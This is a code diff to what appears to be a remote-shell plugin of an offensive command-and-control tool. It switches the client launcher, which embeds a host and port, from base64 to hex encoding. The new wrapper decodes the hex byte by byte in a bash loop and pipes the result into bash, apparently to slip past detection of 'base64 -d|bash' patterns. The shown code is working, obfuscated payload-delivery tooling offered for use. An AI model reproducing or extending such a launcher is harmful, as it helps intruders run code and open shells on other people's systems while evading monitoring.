@@ -82,7 +82,9 @@ class ShellSocketPlugin(contract.IPluginExtension[ShellSocketConfig]):
 class ShellSocketRuntime(contract.IPluginRuntime):
     """Runtime adapter between shell_socket configuration and its transport."""
 
-    DEFAULT_WRAPPER_TEMPLATE: Final[str] = "(echo '$DECLUSOR_SCRIPT'|base64 -d|bash)"
+    DEFAULT_WRAPPER_TEMPLATE: Final[str] = (
+        """bash -c 'printf "%s" "$1" | while IFS= read -r -n2 byte; do printf "%b" "\\\\x$byte"; done | bash' _ '$DECLUSOR_SCRIPT'"""
+    )
 
     def __init__(self, plugin_config: contract.PluginConfig[ShellSocketConfig], /) -> None:
         self._plugin_config = plugin_config
@@ -154,7 +156,7 @@ class ShellSocketProcessor(contract.IPluginProcessor):
         return b"\n".join(all_helpers.values())
 
     def render_launcher(self, host: str, port: int, acknowledge: bytes, /) -> bytes:
-        """Read, interpolate, and Base64-encode the client launcher script.
+        """Read, interpolate, and hex-encode the client launcher script.
 
         Args:
             host: Host address embedded in the client script.
@@ -162,7 +164,7 @@ class ShellSocketProcessor(contract.IPluginProcessor):
             acknowledge: Client acknowledgment bytes embedded in the script.
 
         Returns:
-            The Base64-encoded client bootstrap script as ASCII bytes.
+            The hex-encoded client bootstrap script as ASCII bytes.
         """
 
         launcher_path = self._filesystem.launchers / "shell_socket_client.sh"
@@ -181,7 +183,7 @@ class ShellSocketProcessor(contract.IPluginProcessor):
             DECLUSOR_ACK=hex_ack,
         )
 
-        encoded = util.convert_to_base64(rendered.strip().encode("utf-8"))
+        encoded = rendered.strip().encode("utf-8").hex()
 
         return encoded.encode("ascii")
 
